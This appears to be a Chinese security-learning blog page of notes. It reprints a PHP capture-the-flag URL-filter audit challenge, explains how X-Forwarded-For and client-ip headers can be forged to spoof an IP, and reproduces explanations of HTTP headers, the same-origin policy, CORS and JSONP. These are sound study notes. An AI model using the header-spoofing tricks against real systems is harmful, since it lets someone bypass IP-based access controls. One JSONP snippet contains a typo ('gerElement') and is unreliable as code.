<h1 id="git命令"><a href="#git命令" class="headerlink" title="git命令"></a>git命令</h1><p>使用<code>githack</code>，记录一些命令</p>
<p><a data-fancybox="gallery" data-src="/Noteless/image-20220729114811362.png"><img src="/Noteless/image-20220729114811362.png" alt="image-20220729114811362"></a></p>
<h1 id="随手记录题目"><a href="#随手记录题目" class="headerlink" title="随手记录题目"></a>随手记录题目</h1><h2 id="头疼的php代码审计"><a href="#头疼的php代码审计" class="headerlink" title="头疼的php代码审计"></a>头疼的<code>php</code>代码审计</h2><p>第一眼很头疼的<code>php</code>代码审计，但看着却没有什么太大的考点，这里我没有题目，就在本地试试能不能绕过所有的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// code by SEC@USTC </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;charset&quot; content=&quot;gbk&quot;&gt;&lt;/head&gt;&lt;body&gt;&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$URL</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]; </span><br><span class="line"><span class="comment">//echo &#x27;URL: &#x27;.$URL.&#x27;&lt;br/&gt;&#x27;; </span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;CTF&#123;???&#125;&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$flag</span>, <span class="string">&#x27;CTF&#123;???&#125;&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./index.php&#x27;</span>)); </span><br><span class="line"><span class="variable">$stop</span> = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$URL</span>, <span class="string">&#x27;./&#x27;</span>) !== <span class="literal">FALSE</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">1</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$URL</span>, <span class="string">&#x27;\\&#x27;</span>) !== <span class="literal">FALSE</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">2</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$matches</span> = <span class="keyword">array</span>(); </span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9a-z\/.]+)$/&#x27;</span>, <span class="variable">$URL</span>, <span class="variable">$matches</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$matches</span>) || <span class="variable">$matches</span>[<span class="number">1</span>] != <span class="variable">$URL</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">3</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$URL</span>, <span class="string">&#x27;//&#x27;</span>) !== <span class="literal">FALSE</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">4</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$URL</span>, -<span class="number">10</span>) !== <span class="string">&#x27;/index.php&#x27;</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">5</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$URL</span>, <span class="string">&#x27;p.&#x27;</span>) !== <span class="literal">FALSE</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">6</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="variable">$URL</span> == <span class="string">&#x27;/fan/index.php&#x27;</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">7</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$stop</span>) <span class="variable">$stop</span> = <span class="number">8</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr /&gt;&#x27;</span>; </span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="variable">$stop</span>; <span class="variable">$i</span>++) </span><br><span class="line">    <span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;//Pass &#x27;</span>.<span class="variable">$i</span>, <span class="string">&#x27;//Pass&#x27;</span>, <span class="variable">$code</span>); </span><br><span class="line"><span class="keyword">for</span>(; <span class="variable">$i</span> &lt; <span class="number">8</span>; <span class="variable">$i</span>++) </span><br><span class="line">    <span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;//Pass &#x27;</span>.<span class="variable">$i</span>, <span class="string">&#x27;//Not Pass&#x27;</span>, <span class="variable">$code</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">highlight_string</span>(<span class="variable">$code</span>, <span class="literal">TRUE</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/body&gt;&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="本地回环"><a href="#本地回环" class="headerlink" title="本地回环"></a>本地回环</h1><blockquote>
<p>本地回环地址（<code>Loop back address</code>），不属于任何一个有类别地址类。它代表设备的本地虚拟接口，所以默认被看作是永远不会宕掉的接口。</p>
<p>主要作用有两个：一是测试本机的网络配置，能PING通<code>127.0.0.1</code>说明本机的网卡和<code>IP</code>协议安装都没有问题；另一个作用是某些<code>SERVER/CLIENT</code>的应用程序在运行时需调用服务器上的资源，一般要指定<code>SERVER</code>的<code>IP</code>地址，但当该程序要在同一台机器上运行而没有别的<code>SERVER</code>时就可以把SERVER的资源装在本机，<code>SERVER</code>的<code>IP</code>地址设为<code>127.0.0.1</code>同样也可以运行。</p>
<p><strong>本地回环地址指的是以<code>127</code>开头的地址（<code>127.0.0.1 - 127.255.255.254</code>），通常用<code>127.0.0.1</code>来表示</strong></p>
<p>但是，使用<code>127.0.0.1/8</code>内的不同地址，就可以在本机上设置侦听相同端口的多个服务器</p>
</blockquote>
<h1 id="client-ip和X-Forwarded-For和"><a href="#client-ip和X-Forwarded-For和" class="headerlink" title="client-ip和X-Forwarded-For和"></a><code>client-ip</code>和<code>X-Forwarded-For</code>和</h1><blockquote>
<p>1）<code>client-ip</code>：客户端ip，相较于X-Forwarded-For，它只有一个ip也就是真实ip，当不能伪造XFF头的时候，就可以用client-ip代替，直接指明伪造ip</p>
<p>2）<code>X-Forwarded-For</code>:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP  代理或者负载均衡服务器时才会添加该项。xff是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</p>
</blockquote>
<h1 id="请求头、响应头全部内容"><a href="#请求头、响应头全部内容" class="headerlink" title="请求头、响应头全部内容"></a>请求头、响应头全部内容</h1><h2 id="HTTP请求头"><a href="#HTTP请求头" class="headerlink" title="HTTP请求头"></a>HTTP请求头</h2><blockquote>
<p>Accept：浏览器可接受的MIME类型。</p>
<p>Accept-Charset：浏览器可接受的字符集。</p>
<p>Accept-Encoding：浏览器能够进行解码的数据编码方式，比如gzip。Servlet能够向支持gzip的浏览器返回经gzip编码的HTML页面。许多情形下这可以减少5到10倍的下载时间。</p>
<p>Accept-Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到。</p>
<p><code>Authorization</code>：授权信息，通常出现在对服务器发送的WWW-Authenticate头的应答中。</p>
<p>Connection：表示是否需要持久连接。如果Servlet看到这里的值为“Keep-Alive”，或者看到请求使用的是HTTP 1.1（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间。要实现这一点，Servlet需要在应答中发送一个Content-Length头，最简单的实现方法是：先把内容写入ByteArrayOutputStream，然后在正式写出内容之前计算它的大小。</p>
<p>Content-Length：表示请求消息正文的长度。</p>
<p><code>Cookie</code>：这是最重要的请求头信息之一</p>
<p>From：请求发送者的email地址，由一些特殊的Web客户程序使用，浏览器不会用到它。</p>
<p><code>Host</code>：初始URL中的主机和端口。</p>
<p>If-Modified-Since：只有当所请求的内容在指定的日期之后又经过修改才返回它，否则返回304“Not Modified”应答。</p>
<p>Pragma：指定“no-cache”值表示服务器必须返回一个刷新后的文档，即使它是代理服务器而且已经有了页面的本地拷贝。</p>
<p><code>Referer</code>：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。</p>
<p><code>User-Agent</code>：浏览器类型，如果Servlet返回的内容与浏览器类型有关则该值非常有用。</p>
<p>UA-Pixels，UA-Color，UA-OS，UA-CPU：由某些版本的IE浏览器所发送的非标准的请求头，表示屏幕大小、颜色深度、操作系统和CPU类型。</p>
</blockquote>
<h2 id="HTTP应答头"><a href="#HTTP应答头" class="headerlink" title="HTTP应答头"></a>HTTP应答头</h2><blockquote>
<p>Web服务器的HTTP应答一般由以下几项构成：一个状态行，一个或多个应答头，一个空行，内容文档。设置HTTP应答头往往和设置状态行中的状态代码结合起来。例如，有好几个表示“文档位置已经改变”的状态代码都伴随着一个Location头，而401（Unauthorized）状态代码则必须伴随一个WWW-Authenticate头。<br>然而，即使在没有设置特殊含义的状态代码时，指定应答头也是很有用的。应答头可以用来完成：设置Cookie，指定修改日期，指示浏览器按照指定的间隔刷新页面，声明文档的长度以便利用持久HTTP连接，等等许多其他任务。<br>设置应答头最常用的方法是<code>HttpServletResponse</code>的<code>setHeader</code>，该方法有两个参数，分别表示应答头的名字和值。和设置状态代码相似，设置应答头应该在发送任何文档内容之前进行。</p>
</blockquote>
<blockquote>
<p><code>setContentType</code>：设置Content-Type头。大多数<code>Servlet</code>都要用到这个方法。</p>
<p>setContentLength：设置Content-Length头。对于支持持久HTTP连接的浏览器来说，这个函数是很有用的。</p>
<p><code>addCookie</code>：设置一个Cookie（<code>Servlet</code> <code>API</code>中没有<code>setCookie</code>方法，因为应答往往包含多个Set-Cookie头）。<br>另外，如上节介绍，<code>sendRedirect</code>方法设置状态代码302时也会设置Location头。</p>
<p>HTTP应答头 说明<br>Allow 服务器支持哪些请求方法（如GET、POST等）。</p>
<p>Content-Encoding 文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用<code>gzip</code>压缩文档能够显著地减少HTML文档的下载时间。Java的<code>GZIPOutputStream</code>可以很方便地进行<code>gzip</code>压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，<code>Servlet</code>应该通过查看Accept-Encoding头（即<code>request.getHeader</code>(“Accept-Encoding”)）检查浏览器是否支持gzip，为支持<code>gzip</code>的浏览器返回经<code>gzip</code>压缩的HTML页面，为其他浏览器返回普通页面。</p>
<p>Content-Length 表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入ByteArrayOutputStram，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</p>
<p>Content-Type 表示后面的文档属于什么MIME类型。Servlet默认为text&#x2F;plain，但通常需要显式地指定为<br>text&#x2F;html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。</p>
<p>Date 当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</p>
<p>Expires 应该在什么时候认为文档已经过期，从而不再缓存它？<br>Last-Modified 文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</p>
<p>Location 表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</p>
<p>Refresh 表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">setHeader</span><span class="params">(<span class="string">&quot;Refresh&quot;</span>, <span class="string">&quot;5; URL=http://host/path&quot;</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>让浏览器读取指定的页面。注意这种功能通常是通过设置HTML页面HEAD区的</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;META <span class="attribute">HTTP-EQUIV</span>=<span class="string">&quot;Refresh&quot;</span> <span class="attribute">CONTENT</span>=<span class="string">&quot;5;URL=http://host/path&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p><code>[注，笔者开始把这段代码复制到该博客时，发现一直在向host/path，跳转，最后查看网络，才发现这里这段代码发挥了作用，并没有当作简单的文本]</code></p>
<p>实现，这是因为，自动刷新或重定向对于那些不能使用<code>CGI</code>或<code>Servlet</code>的HTML编写者十分重要。但是，对于<code>Servlet</code>来说，直接设置Refresh头更加方便。注意Refresh的意义是“N秒之后刷新本页面或访问指定页面”，而不是“每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是&lt;META HTTP-EQUIV&#x3D;”Refresh” …&gt;。注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。</p>
<p>Server 服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。</p>
<p><code>Set-Cookie</code> 设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。</p>
<p>WWW-Authenticate 客户应该在Authorization头中提供什么类型的授权信息？在包含401（Unauthorized）状态行的应答中这个头是必需的。例如，<code>response.setHeader</code>(“WWW-Authenticate”, “BASIC realm&#x3D;&quot;executives&quot;“)。注意<code>Servlet</code>一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问（例如<code>.htaccess</code>）。</p>
</blockquote>
<h1 id="响应码"><a href="#响应码" class="headerlink" title="响应码"></a>响应码</h1><blockquote>
<p>HTTP状态码的常见类别和含义如下：</p>
<ul>
<li>1xx（信息性状态码）：表示请求已被接受，需要继续处理。</li>
<li>2xx（成功状态码）：表示请求已成功被服务器接收、理解、并接受处理。</li>
<li>3xx（重定向状态码）：表示需要客户端采取进一步的操作才能完成请求。</li>
<li>4xx（客户端错误状态码）：表示客户端请求错误或无法完成请求。</li>
<li>5xx（服务器错误状态码）：表示服务器在处理请求时发生错误。</li>
</ul>
<p>常见的HTTP状态码包括：</p>
<ul>
<li>200 OK：请求成功。</li>
<li>302 Found：请求的资源已被临时移动到新的位置。</li>
<li>400 Bad Request：请求无效或不完整。</li>
<li>401 Unauthorized：未授权，需要身份验证。</li>
<li>403 Forbidden：服务器拒绝请求。</li>
<li>404 Not Found：请求的资源不存在。</li>
<li>500 Internal Server Error：服务器内部错误。</li>
<li>503 Service Unavailable：服务器暂时无法处理请求。</li>
</ul>
</blockquote>
<h1 id="session利用的小思路"><a href="#session利用的小思路" class="headerlink" title="session利用的小思路"></a>session利用的小思路</h1><p><strong>常见的基本就两种，<code>session</code>文件包含和<code>session</code>反序列化</strong></p>
<p><code>原文链接</code>：<a href="https://xz.aliyun.com/t/10662">https://xz.aliyun.com/t/10662</a></p>
<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">作者：laixiangran</span><br><span class="line">链接：https:<span class="regexp">//</span>juejin.cn<span class="regexp">/post/</span><span class="number">6844903681683357710</span></span><br><span class="line">来源：稀土掘金</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>

<h2 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h2><p>1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。</p>
<p>最初，它的含义是指，A网页设置的 Cookie，B网页不能打开，除非这两个网页”同源”。所谓”同源”指的是”三个相同”。</p>
<blockquote>
<ul>
<li>协议相同</li>
<li>域名相同</li>
<li>端口相同</li>
</ul>
</blockquote>
<p>举例来说，<code>http://www.example.com/dir/page.html</code>这个网址，协议是<code>http://</code>，域名是<code>www.example.com</code>，端口是<code>80</code>（默认端口可以省略）。</p>
<p>它的同源情况如下</p>
<blockquote>
<ul>
<li><code>http://www.example.com/dir2/other.html</code>：同源</li>
<li><code>http://example.com/dir/other.html</code>：不同源（域名不同）</li>
<li><code>http://v2.www.example.com/dir/other.html</code>：不同源（域名不同）</li>
<li><code>http://www.example.com:81/dir/other.html</code>：不同源（端口不同）</li>
</ul>
</blockquote>
<h2 id="限制范围"><a href="#限制范围" class="headerlink" title="限制范围"></a>限制范围</h2><p>随着互联网的发展，”同源政策”越来越严格。目前，如果非同源，共有三种行为受到限制。</p>
<blockquote>
<p>（1） Cookie、LocalStorage 和 IndexDB 无法读取。</p>
<p>（2） DOM 无法获得。</p>
<p>（3） AJAX 请求不能发送。</p>
</blockquote>
<p>虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面，我将详细介绍，如何规避上面三种限制。</p>
<h2 id="为什么要有跨域限制"><a href="#为什么要有跨域限制" class="headerlink" title="为什么要有跨域限制"></a>为什么要有跨域限制</h2><p>因为存在浏览器同源策略，所以才会有跨域问题。那么浏览器是出于何种原因会有跨域的限制呢。其实不难想到，跨域限制主要的目的就是为了用户的上网安全。</p>
<p>如果浏览器没有同源策略，会存在什么样的安全问题呢。下面从 DOM 同源策略和 XMLHttpRequest 同源策略来举例说明：</p>
<p><strong>如果没有 DOM 同源策略，也就是说不同域的 iframe 之间可以相互访问，那么黑客可以这样进行攻击：</strong></p>
<blockquote>
<ol>
<li>做一个假网站，里面用 iframe 嵌套一个银行网站 <code>http://mybank.com</code>。</li>
<li>把 iframe 宽高啥的调整到页面全部，这样用户进来除了域名，别的部分和银行的网站没有任何差别。</li>
<li>这时如果用户输入账号密码，我们的主网站可以跨域访问到 <code>http://mybank.com</code> 的 dom 节点，就可以拿到用户的账户密码了。</li>
</ol>
</blockquote>
<p><strong>如果没有 XMLHttpRequest 同源策略，那么黑客可以进行 CSRF（跨站请求伪造） 攻击：</strong></p>
<blockquote>
<ol>
<li>用户登录了自己的银行页面 <code>http://mybank.com</code>，<code>http://mybank.com</code> 向用户的 cookie 中添加用户标识。</li>
<li>用户浏览了恶意页面 <code>http://evil.com</code>，执行了页面中的恶意 AJAX 请求代码。</li>
<li><code>http://evil.com</code> 向 <code>http://mybank.com</code> 发起 AJAX HTTP 请求，请求会默认把 <code>http://mybank.com</code> 对应 cookie 也同时发送过去。</li>
<li>银行页面从发送的 cookie 中提取用户标识，验证用户无误，response 中返回请求数据。此时数据就泄露了。</li>
<li>而且由于 Ajax 在后台执行，用户无法感知这一过程。</li>
</ol>
</blockquote>
<p>因此，有了浏览器同源策略，我们才能更安全的上网。</p>
<h2 id="跨域的解决方法"><a href="#跨域的解决方法" class="headerlink" title="跨域的解决方法"></a>跨域的解决方法</h2><p>从上面我们了解到了浏览器同源策略的作用，也正是有了跨域限制，才使我们能安全的上网。但是在实际中，有时候我们需要突破这样的限制，因此下面将介绍几种跨域的解决方法。</p>
<h2 id="CORS（跨域资源共享）"><a href="#CORS（跨域资源共享）" class="headerlink" title="CORS（跨域资源共享）"></a>CORS（跨域资源共享）</h2><blockquote>
<p>CORS（Cross-origin resource sharing，跨域资源共享）是一个 W3C 标准，定义了在必须访问跨域资源时，浏览器与服务器应该如何沟通。CORS 背后的基本思想，就是使用自定义的 HTTP 头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。</p>
<p>CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE 浏览器不能低于 IE10。</p>
<p>整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p>
<p>因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。</p>
<p>浏览器将CORS请求分成两类：<code>简单请求（simple request</code>）和<code>非简单请求（not-so-simple request</code>）。</p>
</blockquote>
<p>只要同时满足以下两大条件，就属于<strong>简单请求</strong>。</p>
<blockquote>
<p>1.请求方法是以下三种方法之一：</p>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
<p>2.HTTP的头信息不超出以下几种字段：</p>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值 application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain</li>
</ul>
</blockquote>
<p>凡是不同时满足上面两个条件，就属于<strong>非简单请求</strong>。</p>
<p>浏览器对这两种请求的处理，是不一样的。</p>
<h3 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h3><blockquote>
<ol>
<li>在请求中需要附加一个额外的 Origin 头部，其中包含请求页面的源信息（协议、域名和端口），以便服务器根据这个头部信息来决定是否给予响应。例如：<code>Origin: http://www.laixiangran.cn</code></li>
<li>如果服务器认为这个请求可以接受，就在 Access-Control-Allow-Origin 头部中回发相同的源信息（如果是公共资源，可以回发 * ）。例如：<code>Access-Control-Allow-Origin：http://www.laixiangran.cn</code></li>
<li>没有这个头部或者有这个头部但源信息不匹配，浏览器就会驳回请求。正常情况下，浏览器会处理请求。注意，请求和响应都不包含 cookie 信息。</li>
<li>如果需要包含 cookie 信息，ajax 请求需要设置 xhr 的属性 withCredentials 为 true，服务器需要设置响应头部 <code>Access-Control-Allow-Credentials: true</code>。</li>
</ol>
</blockquote>
<h3 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h3><p>浏览器在发送真正的请求之前，会先发送一个 Preflight 请求给服务器，这种请求使用 OPTIONS 方法，发送下列头部：</p>
<blockquote>
<ul>
<li>Origin：与简单的请求相同。</li>
<li>Access-Control-Request-Method: 请求自身使用的方法。</li>
<li>Access-Control-Request-Headers: （可选）自定义的头部信息，多个头部以逗号分隔。</li>
</ul>
</blockquote>
<p>例如：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">Origin: http://www.laixiangran.cn</span></span><br><span class="line"><span class="section">Access-Control-Request-Method: POST</span></span><br><span class="line"><span class="section">Access-Control-Request-Headers: NCZ</span></span><br></pre></td></tr></table></figure>

<p>发送这个请求后，服务器可以决定是否允许这种类型的请求。服务器通过在响应中发送如下头部与浏览器进行沟通：</p>
<blockquote>
<ul>
<li>Access-Control-Allow-Origin：与简单的请求相同。</li>
<li>Access-Control-Allow-Methods: 允许的方法，多个方法以逗号分隔。</li>
<li>Access-Control-Allow-Headers: 允许的头部，多个方法以逗号分隔。</li>
<li>Access-Control-Max-Age: 应该将这个 Preflight 请求缓存多长时间（以秒表示）。</li>
</ul>
</blockquote>
<p>例如：</p>
<blockquote>
<p>Access-Control-Allow-Origin: <a href="http://www.laixiangran.cn/">http://www.laixiangran.cn</a><br>Access-Control-Allow-Methods: GET, POST<br>Access-Control-Allow-Headers: NCZ<br>Access-Control-Max-Age: 1728000</p>
</blockquote>
<p>一旦服务器通过 Preflight 请求允许该请求之后，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样了。</p>
<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><blockquote>
<ul>
<li>CORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。</li>
<li>支持所有类型的 HTTP 请求。</li>
</ul>
</blockquote>
<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><blockquote>
<ul>
<li>存在兼容性问题，特别是 IE10 以下的浏览器。</li>
<li>第一次发送非简单请求时会多一次请求。</li>
</ul>
</blockquote>
<h2 id="JSONP-跨域"><a href="#JSONP-跨域" class="headerlink" title="JSONP 跨域"></a>JSONP 跨域</h2><blockquote>
<p>由于 <code>script</code> 标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过动态创建 script 标签，然后利用 src 属性进行跨域，这也就是 JSONP 跨域的基本原理。</p>
</blockquote>
<p>直接通过下面的例子来说明 JSONP 实现跨域的流程：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">// 1. 定义一个 回调函数 handleResponse 用来接收返回的数据</span><br><span class="line">function handleResponse(data) &#123;</span><br><span class="line">    console.log(data)<span class="comment">;</span></span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// 2. 动态创建一个 script 标签，并且告诉后端回调函数名叫 handleResponse</span><br><span class="line">var <span class="attr">body</span> = document.getElementsByTagName(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line">var <span class="attr">script</span> = document.gerElement(<span class="string">&#x27;script&#x27;</span>)<span class="comment">;</span></span><br><span class="line"><span class="attr">script.src</span> = <span class="string">&#x27;http://www.laixiangran.cn/json?callback=handleResponse&#x27;</span><span class="comment">;</span></span><br><span class="line">body.appendChild(script)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// 3. 通过 script.src 请求 `http://www.laixiangran.cn/json?<span class="attr">callback</span>=handleResponse`，</span><br><span class="line">// 4. 后端能够识别这样的 URL 格式并处理该请求，然后返回 handleResponse(&#123;&quot;name&quot;: &quot;laixiangran&quot;&#125;) 给浏览器</span><br><span class="line">// 5. 浏览器在接收到 handleResponse(&#123;&quot;name&quot;: &quot;laixiangran&quot;&#125;) 之后立即执行 ，也就是执行 handleResponse 方法，获得后端返回的数据，这样就完成一次跨域请求了。</span><br></pre></td></tr></table></figure>

<h3 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h3><blockquote>
<ul>
<li>使用简便，没有兼容性问题，目前最流行的一种跨域方法。</li>
</ul>
</blockquote>
<h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><blockquote>
<ul>
<li>只支持 GET 请求。</li>
<li>由于是从其它域中加载代码执行，因此如果其他域不安全，很可能会在响应中夹带一些恶意代码。</li>
<li>要确定 JSONP 请求是否失败并不容易。虽然 HTML5 给 script 标签新增了一个 onerror 事件处理程序，但是存在兼容性问题。</li>
</ul>
</blockquote>
<h2 id="图像-Ping-跨域"><a href="#图像-Ping-跨域" class="headerlink" title="图像 Ping 跨域"></a>图像 Ping 跨域</h2><blockquote>
<p>由于 <code>img</code> 标签不受浏览器同源策略的影响，允许跨域引用资源。</p>
<p>因此可以通过 img 标签的 src 属性进行跨域，这也就是图像 Ping 跨域的基本原理。</p>
</blockquote>
<p>直接通过下面的例子来说明图像 Ping 实现跨域的流程：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">var <span class="attr">img</span> = new Image()<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// 通过 onload 及 onerror 事件可以知道响应是什么时候接收到的，但是不能获取响应文本</span><br><span class="line"><span class="attr">img.onload</span> = img.<span class="literal">on</span>error = function() &#123;</span><br><span class="line">    console.log(&quot;Done!&quot;)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 请求数据通过查询字符串形式发送</span><br><span class="line"><span class="attr">img.src</span> = <span class="string">&#x27;http://www.laixiangran.cn/test?name=laixiangran&#x27;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h3 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h3><blockquote>
<ul>
<li>用于实现跟踪用户点击页面或动态广告曝光次数有较大的优势。</li>
</ul>
</blockquote>
